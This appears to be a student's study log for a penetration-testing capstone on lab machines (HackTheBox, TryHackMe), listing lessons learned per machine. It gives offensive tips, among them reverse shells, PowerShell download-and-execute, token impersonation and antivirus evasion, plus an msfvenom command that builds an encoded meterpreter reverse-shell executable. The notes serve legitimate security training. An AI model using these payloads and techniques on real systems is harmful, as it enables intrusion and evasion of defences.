# Capstone Challenge

### Capstone Overview

Attempt in 24 - 48hrs without help

5 machines (easiest to hardest):

### Arctic (HTB) - Done

Lessons learned:
- Metasploit's web_delivery module is a powerful tool for limited RCE
- Not relevant to the machine, but Impacket's rpcdump is great for RPC enumeration

### Bastard (HTB) - Done

Lessons learned:
- Remember to use 443 for reverse shells
- Work your way through available exploits, if one doesn't work for you try an alternative
- powershell download & execute commands are a powerful way to execute scripts from the attacking machine
- Sherlock.ps1 is very useful

### Alfred (THM) - Done

Lessons learned:
- Try default credentials first (admin:admin, admin:password, etc)
- Use payload encoding to bypass AV
- If you see SeDebugPrivilege and SeImpersonatePrivilege think token abuse (meterpreter incognito)
- If you can't access a file or directory after token impersonation, try migrating to a diferent process

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443 -f exe -o shell.exe`

### Bastion (HTB) - Done

Lessons learned:
- Check installed programs! (Program Files/(x86))
- mRemoteNG is an easy target for passwords
- Mount SMB shares for easy access when dealing with large files
- guestmount vhd files to find juicy data

`sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd`

### Querier (HTB)


